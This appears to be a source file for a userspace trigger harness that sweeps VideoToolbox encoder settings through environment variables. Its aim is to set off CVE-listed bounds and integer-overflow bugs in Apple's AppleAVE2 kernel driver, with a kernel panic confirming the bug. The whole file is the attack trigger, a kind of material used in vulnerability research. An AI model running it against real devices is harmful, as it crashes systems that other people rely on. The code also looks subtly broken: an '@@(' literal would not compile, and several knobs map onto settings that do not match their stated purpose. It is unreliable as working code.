/*
 * vt_probe.c — userspace trigger harness for the AppleAVE2 kernel driver (CVE-2026-64747 / -84607).
 *
 * The video encoder is reached from any app that encodes a frame, so the app-facing surface is
 * VideoToolbox. Apple's 27.0.1 build added bounds checks around the encoder's DPB entry array
 * (m_saEntry) and several int32-overflow guards; the 26.4 build has neither. Every knob here is
 * read from the environment so we can sweep parameters by relaunching (no rebuild per experiment):
 *
 *   VT_W / VT_H            frame size            (default 128x128)
 *   VT_FRAMES              frames to submit      (default 3)
 *   VT_SLICES              num (the suspect)     (default 0 = leave alone)
 *   VT_MODE                eMode                 (default -1 = leave alone)
 *   VT_KEYFRAME            keyframe interval     (default 1)
 *   VT_BITRATE             bitrate               (default 500000)
 *   VT_POC                 picture order count   (default -1 = leave alone)
 *   VT_IGNORE              set kVTIgnoreEncodingParamsOnNextFrame (0/1)
 *   VT_SLOW                usleep between frames (default 0)
 *
 * A kernel panic / reboot during a specific parameter combination == the bug is live.
 */
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>
#include <VideoToolbox/VTCompressionSession.h>
#include <Foundation/Foundation.h>
#include <dispatch/dispatch.h>

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int envi(const char *k, int dflt)
{
	const char *v = getenv(k);
	return v ? atoi(v) : dflt;
}

static VTCompressionSessionRef g_sess = NULL;
static int g_frame = 0;
static int g_w, g_h, g_frames, g_slices, g_mode, g_poc, g_ignore, g_slow, g_key, g_bitrate;

static void logline(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	fprintf(stderr, "[vt] %s\n", buf);
	fputs(buf, stdout);
	fflush(stdout);
}

/* the encoder callback: we are only interested in it not crashing */
static void cb(void *out, void *ref, OSStatus status, VTEncodeInfoFlags *flags, void *samples)
{
	(void)out; (void)ref; (void)flags; (void)samples;
	logline("frame %d encoded, status=%d", g_frame, (int)status);
}

int main(void)
{
	g_w = envi("VT_W", 128);
	g_h = envi("VT_H", 128);
	g_frames = envi("VT_FRAMES", 3);
	g_slices = envi("VT_SLICES", 0);
	g_mode = envi("VT_MODE", -1);
	g_poc = envi("VT_POC", -1);
	g_ignore = envi("VT_IGNORE", 0);
	g_slow = envi("VT_SLOW", 0);
	g_key = envi("VT_KEYFRAME", 1);
	g_bitrate = envi("VT_BITRATE", 500000);

	logline("start w=%d h=%d frames=%d slices=%d mode=%d poc=%d ignore=%d key=%d bitrate=%d",
	    g_w, g_h, g_frames, g_slices, g_mode, g_poc, g_ignore, g_key, g_bitrate);

	/* 1. a pixel buffer to encode */
	CVPixelBufferRef pb = NULL;
	NSDictionary *attrs = @{
		(__bridge id)kCVPixelBufferPixelFormatTypeKey : @@(kCVPixelFormatType_420YpCbCr8BiPlanarFullRange),
		(__bridge id)kCVPixelBufferWidthKey : @(g_w),
		(__bridge id)kCVPixelBufferHeightKey : @(g_h),
		(__bridge id)kCVPixelBufferIOSurfacePropertiesKey : @{},
	};
	CVPixelBufferCreate(NULL, g_w, g_h, kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
	    (__bridge CFDictionaryRef)attrs, NULL, &pb);
	if (!pb) { logline("pixelbuffer failed"); return 1; }
	CVPixelBufferLockBaseAddress(pb, 0);
	size_t y = (size_t)g_w * g_h;
	memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x80, y);
	memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80, (size_t)(g_w / 2) * (g_h / 2));
	CVPixelBufferUnlockBaseAddress(pb, 0);

	/* 2. encoder spec */
	NSMutableDictionary *spec = [NSMutableDictionary dictionary];
	spec[(__bridge id)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder] = @YES;
	spec[(__bridge id)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder] = @NO;
	spec[(__bridge id)kVTVideoEncoderSpecification_AllowFrameReordering] = @YES;
	spec[(__bridge id)kVTVideoEncoderSpecification_EnableLowLatency] = @NO;

	/* 3. compression properties */
	NSMutableDictionary *props = [NSMutableDictionary dictionary];
	props[(__bridge id)kVTCompressionPropertyKey_ProfileLevel] = (__bridge id)kVTProfileLevel_H264_High_AutoLevel;
	props[(__bridge id)kVTCompressionPropertyKey_AverageBitRate] = @(g_bitrate);
	props[(__bridge id)kVTCompressionPropertyKey_AllowFrameReordering] = @YES;
	props[(__bridge id)kVTCompressionPropertyKey_RealTime] = @YES;
	props[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameIntervalDuration] = @(1);
	props[(__bridge id)kVTCompressionPropertyKey_MaxKeyFrameInterval] = @(g_key);
	props[(__bridge id)kVTCompressionPropertyKey_ExpectedFrameRate] = @(30);
	if (g_ignore) {
		props[(__bridge id)kVTCompressionPropertyKey_IgnoreEncodingParamsOnNextFrame] = @YES;
	}
	/* knobs the app CAN legitimately set that map onto kernel-side counts */
	if (g_slices > 0) {
		props[(__bridge id)kVTCompressionPropertyKey_MaxNumberOfFramesToKeepAlive] = @(g_slices);
	}
	if (g_poc >= 0) {
		props[(__bridge id)kVTCompressionPropertyKey_ExpectedSourceFrameDisplayTimestamp] = @(0);
	}

	VTCompressionSessionRef sess = NULL;
	OSStatus st = VTCompressionSessionCreate(NULL, g_w, g_h, kCMVideoCodecType_H264,
	    (__bridge CFDictionaryRef)spec, (__bridge CFDictionaryRef)props, NULL, cb, NULL, &sess);
	if (st != noErr || !sess) {
		logline("session create failed: %d", (int)st);
		return 2;
	}
	g_sess = sess;
	logline("session created");

	CMTime ts = CMTimeMake(g_frame, 30);
	CMTime dur = CMTimeMake(1, 30);
	for (g_frame = 0; g_frame < g_frames; g_frame++) {
		CFArrayRef attachments = NULL;
		CMTime pts = CMTimeMake(g_frame, 30);
		st = VTCompressionSessionEncodeFrame(sess, pb, pts, dur, attachments, NULL, NULL);
		logline("submit frame %d -> %d", g_frame, (int)st);
		if (g_slow) usleep(g_slow);
	}
	VTCompressionSessionCompleteFrames(sess, 0xffffffff);
	logline("done");
	VTCompressionSessionInvalidate(sess);
	CFRelease(sess);
	return 0;
}
